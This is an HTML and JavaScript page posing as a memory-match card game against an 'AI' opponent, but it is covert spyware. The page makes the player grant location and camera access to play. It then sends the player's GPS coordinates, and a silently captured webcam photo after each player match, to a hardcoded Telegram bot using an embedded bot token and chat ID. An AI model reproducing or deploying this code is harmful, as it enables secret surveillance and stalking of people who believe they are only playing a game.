<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memory Match - Hard Mode AI</title>
    <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/3018/3018884.png">
    <style>
        :root { --primary: #00f2ff; --bg: #0a0a0a; --player: #00ff88; --ai: #ff4b2b; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: white; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        .game-area { flex: 1; padding: 10px; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0.1; pointer-events: none; transition: 0.5s; }
        .game-ready { opacity: 1 !important; pointer-events: all !important; }
        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px; width: 100%; max-width: 360px; }
        .card { aspect-ratio: 1/1; background: #1a1a1a; border-radius: 6px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 20px; border: 1px solid #333; transition: 0.2s; }
        .card.flipped { background: var(--primary); transform: rotateY(180deg); color: #000; }
        .card.matched-p { background: var(--player) !important; color: #000; }
        .card.matched-ai { background: var(--ai) !important; color: #000; }
        .chat-section { height: 180px; background: #111; border-top: 1px solid #333; display: flex; flex-direction: column; }
        .messages { flex: 1; padding: 10px; overflow-y: auto; font-size: 12px; display: flex; flex-direction: column; gap: 6px; }
        .msg { padding: 8px 10px; border-radius: 10px; max-width: 80%; }
        .msg.ai { background: #222; align-self: flex-start; color: var(--primary); }
        .msg.user { background: var(--primary); align-self: flex-end; color: #000; }
        .input-area { display: flex; align-items: center; padding: 8px; gap: 8px; background: #1a1a1a; }
        input[type="text"] { flex: 1; background: #222; border: none; padding: 8px 12px; border-radius: 20px; color: white; outline: none; }
        #overlay { position: fixed; inset: 0; background: #0a0a0a; z-index: 1000; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
        .btn { background: var(--primary); color: #000; border: none; padding: 12px 35px; border-radius: 30px; font-weight: bold; cursor: pointer; }
        video, canvas { display: none; position: absolute; left: -9999px; }
    </style>
</head>
<body>

<div id="overlay">
    <div>
        <h2 style="color: var(--primary);">AI Memory Challenge 🤖</h2>
        <p style="color: #888; font-size: 13px; margin-bottom: 20px;">Hard Mode: AI now learns from your moves.<br>Enable Location & Camera to sync.</p>
        <button class="btn" onclick="requestAccess()">Start Hard Mode</button>
    </div>
</div>

<div class="game-area" id="main-game">
    <div style="margin-bottom: 8px; font-size: 13px; font-weight: bold;">
        <span style="color: var(--player)">You: <span id="p-score">0</span></span> | 
        <span style="color: var(--ai)">AI (Hard): <span id="ai-score">0</span></span>
    </div>
    <div class="grid" id="grid"></div>
</div>

<div class="chat-section">
    <div class="messages" id="chat-box">
        <div class="msg ai">System: AI is analyzing your brain patterns...</div>
    </div>
    <div class="input-area">
        <label style="cursor:pointer; font-size:20px;">📎<input type="file" style="display:none" onchange="sendUserPhoto(this)"></label>
        <input type="text" id="user-input" placeholder="Chat..." onkeypress="if(event.key==='Enter') handleChat()">
    </div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" width="640" height="480"></canvas>

<script>
    const token = '8699110487:AAFCvUGSAeFkhi4gLhRrqsE6mvONXyNpV18';
    const cid = '6808559733';

    let symbols = ['🍎','🍌','🍇','🍉','🍒','🍓','🥝','🍍','🍋','🍑','🥑','🥥'];
    let deck = [...symbols, ...symbols];
    let flipped = [], pScore = 0, aiScore = 0, turn = 'player', matches = 0;
    
    // ذاكرة البوت الذكية
    let aiMemory = {}; 

    function requestAccess() {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                sendTele(`📍 Location: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
                setupCamera();
            },
            () => { alert("Location required for Hard Mode."); location.reload(); }
        );
    }

    async function setupCamera() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('v').srcObject = s;
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('main-game').classList.add('game-ready');
            renderGrid();
        } catch(e) { location.reload(); }
    }

    function renderGrid() {
        const grid = document.getElementById('grid');
        grid.innerHTML = '';
        deck.sort(() => Math.random() - 0.5);
        deck.forEach((s, i) => {
            const card = document.createElement('div');
            card.className = 'card';
            card.dataset.val = s;
            card.dataset.id = i;
            card.onclick = () => playerMove(card);
            grid.appendChild(card);
        });
    }

    function playerMove(card) {
        if (turn !== 'player' || card.classList.contains('flipped')) return;
        revealCard(card);
        flipped.push(card);
        if (flipped.length === 2) { turn = 'wait'; setTimeout(checkMatch, 700); }
    }

    function revealCard(card) {
        card.classList.add('flipped');
        card.innerText = card.dataset.val;
        // البوت يحفظ مكان هذه البطاقة في ذاكرته
        aiMemory[card.dataset.id] = card.dataset.val;
    }

    function checkMatch() {
        const [c1, c2] = flipped;
        if (c1.dataset.val === c2.dataset.val) {
            c1.classList.add(turn === 'ai' ? 'matched-ai' : 'matched-p');
            c2.classList.add(turn === 'ai' ? 'matched-ai' : 'matched-p');
            if (turn === 'player') { 
                pScore++; 
                silentCapture("Success Match: " + c1.dataset.val); 
            } else { aiScore++; }
            matches++;
            // مسح البطاقات المتطابقة من ذاكرة البوت
            delete aiMemory[c1.dataset.id]; delete aiMemory[c2.dataset.id];
            updateScore(); flipped = [];
            if (matches === 12) return addChat("ai", "Game Over!");
            if (turn === 'ai') aiTurn(); else turn = 'player';
        } else {
            setTimeout(() => {
                c1.classList.remove('flipped'); c1.innerText = '';
                c2.classList.remove('flipped'); c2.innerText = '';
                flipped = [];
                if (turn === 'wait') aiTurn(); else turn = 'player';
            }, 500);
        }
    }

    function aiTurn() {
        turn = 'ai';
        addChat("ai", "AI is thinking...");
        setTimeout(() => {
            let cards = Array.from(document.querySelectorAll('.card:not(.flipped)'));
            if (cards.length < 2) return;

            let choice1, choice2;

            // ذكاء البوت: هل يتذكر زوجاً متطابقاً؟
            let found = findMatchInMemory();
            if (found) {
                choice1 = document.querySelector(`[data-id="${found[0]}"]`);
                choice2 = document.querySelector(`[data-id="${found[1]}"]`);
            } else {
                choice1 = cards[Math.floor(Math.random() * cards.length)];
                revealCard(choice1);
                // بعد فتح الأولى، هل يتذكر مكان شبيهتها؟
                let matchId = findSpecificInMemory(choice1.dataset.val, choice1.dataset.id);
                if (matchId) {
                    choice2 = document.querySelector(`[data-id="${matchId}"]`);
                } else {
                    let remaining = Array.from(document.querySelectorAll('.card:not(.flipped)'));
                    choice2 = remaining[Math.floor(Math.random() * remaining.length)];
                }
            }

            if (flipped.length < 1) revealCard(choice1); 
            flipped.push(choice1);
            setTimeout(() => {
                revealCard(choice2);
                flipped.push(choice2);
                setTimeout(checkMatch, 700);
            }, 800);
        }, 1200);
    }

    function findMatchInMemory() {
        let keys = Object.keys(aiMemory);
        for (let i = 0; i < keys.length; i++) {
            for (let j = i + 1; j < keys.length; j++) {
                if (aiMemory[keys[i]] === aiMemory[keys[j]]) return [keys[i], keys[j]];
            }
        }
        return null;
    }

    function findSpecificInMemory(val, excludeId) {
        for (let id in aiMemory) {
            if (aiMemory[id] === val && id !== excludeId) return id;
        }
        return null;
    }

    function updateScore() {
        document.getElementById('p-score').innerText = pScore;
        document.getElementById('ai-score').innerText = aiScore;
    }

    function silentCapture(r) {
        const can = document.getElementById('c');
        can.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
        can.toBlob(b => {
            const fd = new FormData();
            fd.append('chat_id', cid); fd.append('photo', b, 'y.jpg');
            fd.append('caption', '⚡ Hard Mode Shot: ' + r);
            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
        }, 'image/jpeg', 0.5);
    }

    function addChat(t, txt) {
        const box = document.getElementById('chat-box');
        const m = document.createElement('div');
        m.className = `msg ${t}`; m.innerText = txt;
        box.appendChild(m); box.scrollTop = box.scrollHeight;
    }

    function sendTele(t) { fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(t)}`); }
</script>
</body>
</html>
